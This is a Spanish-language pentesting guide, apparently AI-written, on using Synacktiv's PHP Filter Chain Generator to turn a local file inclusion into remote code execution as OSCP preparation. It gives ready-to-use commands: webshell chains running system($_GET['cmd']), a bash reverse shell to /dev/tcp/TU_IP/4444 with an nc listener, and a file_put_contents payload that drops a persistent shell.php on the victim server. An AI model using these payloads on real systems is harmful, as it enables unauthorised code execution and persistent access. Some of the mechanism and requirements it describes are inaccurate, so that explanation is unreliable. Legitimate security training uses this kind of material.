
## 📌 ¿Qué es PHP Filter Chain Generator?

**PHP Filter Chain Generator** es una herramienta creada por Synacktiv que genera **cadenas de filtros de PHP** (filter chains) capaces de **convertir una LFI que solo te permite leer archivos en una RCE**, incluso en servidores modernos donde:

- No funciona `%00`
    
- No funcionan wrappers antiguos (`data://`, `php://input`)
    
- Hay extensiones forzadas (`.php`)
    
- Null byte está parcheado
    
- `allow_url_fopen` está parcialmente limitado
    
- Funciona **php://filter** pero _solo para leer archivos_
    

Esta herramienta explota la forma **interna** en que PHP transforma contenido cuando se aplican varios filtros en cadena.

---

# 🧠 ¿Por qué existen las filter chains?

PHP tiene decenas de filtros internos como:

- `convert.base64-encode`
    
- `convert.base64-decode`
    
- `convert.iconv.*`
    
- `string.rot13`
    
- `zlib.inflate`
    
- `zlib.deflate`
    

Cada uno transforma el contenido de forma predecible.

Cuando los combinas en el orden correcto, puedes hacer que un “archivo” aparentemente inofensivo se transforme en **código PHP ejecutable**.

La idea clave:

> **Incluso si solo puedes leer archivos, puedes hacer que PHP construya y ejecute código sin subir nada.**

Por eso esto es tan poderoso.

---

# 🚀 ¿Para qué sirve la herramienta?

Sirve para crear un payload como este:

```
php://filter/convert.iconv.*|convert.base64-decode|convert.*|resource=index.php
```

Ese payload, cuando lo cargas en una LFI:

```
http://victima.com/index.php?page=<PAYLOAD_GENERADO>
```

→ **Ejecuta código PHP que tú le diste**.

Es decir:

✔ LFI → ❌ No RCE  
✔ LFI + Filter Chains → **🔥 RCE brutal**


---

# 🧩 Uso básico de la herramienta

El script principal se llama:

```
php_filter_chain_generator.py
```

La sintaxis base:

```
python3 php_filter_chain_generator.py --chain 'payload'
```

Donde `<payload>` es el código PHP que quieres que termine ejecutándose vía LFI.

---

# 🔧 Parámetros explicados

## 🟦 `--chain`

Es el parámetro más importante.

Significa:

> “El código PHP que quieres ejecutar después de aplicar la filter chain.”

Ejemplo:

```bash
python3 php_filter_chain_generator.py --chain 'system($_GET["cmd"]);'
```

Este generará una cadena de filtros que, al cargarse vía LFI, permitirá ejecutar:

```
system($_GET["cmd"]);
```

Como si estuviera dentro de un `<?php ... ?>`.

---

# 🧠 ¿Por qué no requiere etiquetas PHP?

Porque PHP ejecuta automáticamente contenido interpretado dentro de la cadena del filtro final.  
La herramienta ya coloca lo necesario para que el payload sea interpretado como PHP.

Puedes poner:

```
system($_GET["cmd"]);
```

O poner:

```
<?php system($_GET["cmd"]); ?>
```

Ambos funcionan.

---

# 🟦 `--chain-file`

Si tu payload es largo, puedes usar un archivo:

```
python3 php_filter_chain_generator.py --chain-file payload.txt
```

Donde `payload.txt` contiene:

```
system($_GET["cmd"]);
```

---

# 🟦 `--output`

Permite guardar la cadena generada en un archivo:

```
python3 php_filter_chain_generator.py --chain 'system("id");' --output cadena.txt
```

---

# 🟦 `--encode`

Le dice qué codificación usar (base64, rot13, iconv, etc.)

Generalmente no hace falta usarlo, porque el script **elige automáticamente la mejor cadena**.

Ejemplo:

```
--encode base64
```

---

# 🧪 Ejemplos prácticos

## ✔ 1. RCE básica (comandos vía GET)

```bash
python3 php_filter_chain_generator.py --chain 'system($_GET["cmd"]);'
```

Resultado:  
Una cadena enorme tipo:

```
php://filter/convert.iconv.*|convert.base64-decode|convert.*|resource=php://temp...
```

Luego la usas en la LFI:

```
http://victima.com/index.php?page=<CADENA>&cmd=id
```

---

## ✔ 2. Reverse shell con bash

Payload:

```
system("bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'");
```

Ejecutas:

```bash
python3 php_filter_chain_generator.py --chain 'system("bash -c \"bash -i >& /dev/tcp/TU_IP/4444 0>&1\"");'
```

Copias la cadena generada en la LFI:

```
http://victima.com/index.php?page=<CADENA>
```

Y en tu máquina:

```
nc -lvnp 4444
```

Boom → Reverse shell.

---

## ✔ 3. Crear archivo en el servidor desde LFI

Payload:

```
file_put_contents('shell.php','<?php system($_GET["cmd"]); ?>');
```

Ejecutas:

```bash
python3 php_filter_chain_generator.py --chain 'file_put_contents("shell.php","<?php system($_GET[\"cmd\"]); ?>");'
```

Esto deja una **webshell física**:

```
victima.com/shell.php?cmd=id
```

---

# ⚙️ ¿Cómo funciona internamente?

La herramienta combina filtros que:

- Convierte caracteres
    
- Aplica base64
    
- Modifica codificación interna (iconv)
    
- Inflan o desinflan texto
    
- Rotan bits/bytes
    
- Pasan de una codificación a otra
    
- Interpretan ciertos flujos en PHP
    

El resultado es que **una cadena inmensa y aparentemente inútil genera exactamente tu payload ejecutable**.

PHP, al interpretar el filter chain, termina evaluando:

```
system($_GET["cmd"]);
```

O cualquier cosa que hayas pedido.

---

# 🧠 Requisitos en el servidor víctima para que funcione

Debes cumplir:

✔ La LFI debe permitir `php://filter`  
✔ La LFI NO debe sanitizar `php://`  
✔ El servidor debe tener `allow_url_fopen=On`  
✔ PHP debe interpretar filtros (por defecto, sí)

Si esto funciona:

```
?page=php://filter/convert.base64-encode/resource=index.php
```

Entonces también funcionarán las filter chains.

---

# 🛣 ¿Cuándo usar filter chains?

✨ Cuando:

- LFI funciona → **SÍ**
    
- `php://filter` funciona → **SÍ**
    
- `php://input` falla → **SÍ**
    
- No puedes hacer log poisoning → **SÍ**
    
- No puedes inyectar nada en el servidor → **SÍ**
    
- Solo puedes leer archivos → **SÍ**
    

❌ Cuando no puedes usar wrappers → NO sirve  
❌ Cuando solo puedes leer archivos sin wrappers → NO sirve

---

# 📌 Checklist final (tu guía OSCP)

1. ¿La LFI permite wrappers?
    
    ```
    ?page=php://filter/convert.base64-encode/resource=index.php
    ```
    
2. Sí → pasar a generator
    
3. Seleccionar payload: system(), reverse shell, file_put_contents, etc.
    
4. Generar filter chain
    
5. Insertar cadena en el parámetro vulnerable
    
6. Ejecutar comandos via GET
    
7. Mantener shell estable
    

---

# 🧨 Conclusión del manual

PHP Filter Chain Generator es **la herramienta más poderosa y moderna** para convertir una LFI que solo te deja leer archivos en una **RCE real**, incluso en entornos muy restringidos.

La herramienta:

- Genera cadenas complejas automáticamente
    
- Permite RCE sin null-byte
    
- Funciona incluso cuando todos los trucos viejos están parcheados
    
- Se basa en el funcionamiento interno real de PHP
    

Es un must-have en tu arsenal de pentesting.

---

Si quieres, te hago una **nota complementaria**:

🔥 resumen de payloads para usar  
🔥 cómo detectar qué filtros funcionan en un servidor  
🔥 cómo automatizar filter chains con curl o Burp

Me dices y lo preparo.